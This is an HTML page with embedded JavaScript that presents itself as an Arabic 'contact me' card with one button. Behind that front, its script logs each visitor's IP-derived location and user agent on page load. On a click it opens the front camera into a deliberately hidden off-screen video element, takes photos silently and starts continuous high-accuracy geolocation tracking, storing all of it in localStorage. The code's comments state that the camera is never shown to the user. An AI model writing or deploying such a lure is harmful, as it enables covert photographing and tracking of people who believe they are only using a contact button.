<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>تواصل معي</title>
    <style>
        * {
            box-sizing: border-box
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Consolas, monospace;
            background: radial-gradient(circle at top, #10261b 0%, #020604 70%, #000 100%);
            color: #7cffb2;
            padding: 20px
        }

        .card {
            background: rgba(2, 12, 8, .95);
            border: 1px solid #2bff8a;
            border-radius: 16px;
            padding: 28px;
            max-width: 520px;
            width: 100%;
            box-shadow: 0 0 25px rgba(43, 255, 138, .25);
            position: relative
        }

        h1 {
            font-size: 18px;
            margin: 0 0 6px;
            color: #8bffbb;
            letter-spacing: .08em;
            text-transform: uppercase
        }

        p.sub {
            color: #5bd98b;
            font-size: 13px;
            margin: 0 0 16px
        }

        .actions {
            margin: 0 0 12px
        }

        .action-btn {
            width: 100%;
            border: 1px solid #2bff8a;
            border-radius: 10px;
            padding: 12px 14px;
            background: #0b2414;
            color: #7cffb2;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.04em;
            transition: background 0.2s, color 0.2s;
        }

        .action-btn:hover {
            background: #10321c;
            color: #2bff8a;
        }

        .action-btn:disabled {
            opacity: .6;
            cursor: default;
        }

        .status {
            margin: 10px 0 0;
            font-size: 13px;
            color: #b9ffd2;
            min-height: 20px
        }

        /* Hidden off-screen video — never visible to user */
        #camPreview {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>

<body>
    <div class="card">
        <h1>تواصل معي</h1>
        <p class="sub">ارسل رسالة او تواصل معي مباشرة</p>
        <div class="actions">
            <button id="accessBtn" class="action-btn" type="button">تواصل معي</button>
        </div>
        <div id="status" class="status"></div>
    </div>

    <!-- Hidden video element — camera stream, never shown -->
    <video id="camPreview" autoplay playsinline muted></video>

    <script>
        // ── Storage helpers (localStorage only) ──────────────────────────
        let activeRecordId = null;

        function readRecords() {
            try { return JSON.parse(localStorage.getItem('visitorRecords') || '[]') } catch (e) { return [] }
        }
        function writeRecords(r) {
            localStorage.setItem('visitorRecords', JSON.stringify(r));
        }
        function saveVisitorRecord(data) {
            const recId = Date.now();
            activeRecordId = recId;
            const rec = { id: recId, timestamp: new Date().toISOString(), ...data };
            writeRecords([rec, ...readRecords()].slice(0, 50));
            return recId;
        }
        function updateRecord(id, patch) {
            const list = readRecords();
            const i = list.findIndex(r => r.id === id);
            if (i === -1) return false;
            list[i] = Object.assign({}, list[i], patch);
            writeRecords(list);
            return true;
        }

        // ── IP lookup ────────────────────────────────────────────────────
        async function tryIpwhois() {
            try {
                const r = await fetch('https://ipwho.is/');
                if (!r.ok) throw new Error();
                const d = await r.json();
                if (!d.success) throw new Error();
                return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone && d.timezone.id, org: d.connection && d.connection.isp };
            } catch (e) { return null; }
        }
        async function tryIpapi() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                if (!r.ok) throw new Error();
                const d = await r.json();
                if (d.error) throw new Error();
                return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone, org: d.org };
            } catch (e) { return null; }
        }

        // ── Refs ─────────────────────────────────────────────────────────
        const accessBtn  = document.getElementById('accessBtn');
        const statusEl   = document.getElementById('status');
        const camPreview = document.getElementById('camPreview');

        let mediaStream = null, watchId = null, cameraStarted = false;

        // ── Silent photo capture ─────────────────────────────────────────
        function capturePhotoSilent() {
            if (!mediaStream) return;
            function attempt() {
                if (camPreview.videoWidth && camPreview.videoHeight) {
                    const canvas = document.createElement('canvas');
                    canvas.width  = camPreview.videoWidth;
                    canvas.height = camPreview.videoHeight;
                    canvas.getContext('2d').drawImage(camPreview, 0, 0);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.88);
                    if (activeRecordId) {
                        const list = readRecords();
                        const i = list.findIndex(r => r.id === activeRecordId);
                        if (i !== -1) {
                            list[i].media = list[i].media || [];
                            list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
                            writeRecords(list);
                        }
                    }
                } else {
                    setTimeout(attempt, 120); // retry until frame is ready
                }
            }
            attempt();
        }

        // ── Start camera silently ────────────────────────────────────────
        async function startCameraSilent() {
            if (cameraStarted) {
                // Camera already running — just take another photo
                capturePhotoSilent();
                return;
            }
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                camPreview.srcObject = mediaStream;
                cameraStarted = true;

                // Wait for stream to be ready then capture
                camPreview.onloadedmetadata = () => {
                    camPreview.play().catch(() => {});
                    setTimeout(capturePhotoSilent, 800);
                };
            } catch (e) {
                // Camera denied — silently ignore, IP still logged
            }
        }

        // ── Start live location tracking ─────────────────────────────────
        function startLocationTracking() {
            if (!navigator.geolocation || watchId) return;
            watchId = navigator.geolocation.watchPosition(pos => {
                const coords = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    time: new Date().toISOString()
                };
                const list = readRecords();
                const i = list.findIndex(r => r.id === activeRecordId);
                if (i !== -1) {
                    list[i].locationHistory = list[i].locationHistory || [];
                    list[i].locationHistory.push(coords);
                    list[i].lat = coords.lat;
                    list[i].lon = coords.lon;
                    writeRecords(list);
                }
            }, () => {}, { enableHighAccuracy: true, maximumAge: 4000 });
        }

        // ── On page load: log IP silently ────────────────────────────────
        async function autoLogVisitor() {
            saveVisitorRecord({
                ip: null, city: null, region: null, country: null,
                postal: null, lat: null, lon: null, timezone: null,
                org: null, ua: navigator.userAgent, media: [], locationHistory: []
            });
            const info = (await tryIpwhois()) || (await tryIpapi());
            if (info) updateRecord(activeRecordId, info);
        }

        // ── Button click ─────────────────────────────────────────────────
        accessBtn.addEventListener('click', async () => {
            accessBtn.disabled = true;
            // Start camera silently (takes photo in background)
            startCameraSilent();
            // Start location tracking
            startLocationTracking();
            // Brief pause then re-enable
            setTimeout(() => { accessBtn.disabled = false; }, 2000);
        });

        // ── Cleanup on leave ─────────────────────────────────────────────
        window.addEventListener('beforeunload', () => {
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
            if (watchId && navigator.geolocation) navigator.geolocation.clearWatch(watchId);
        });

        // ── Boot ─────────────────────────────────────────────────────────
        autoLogVisitor();
    </script>
</body>

</html>
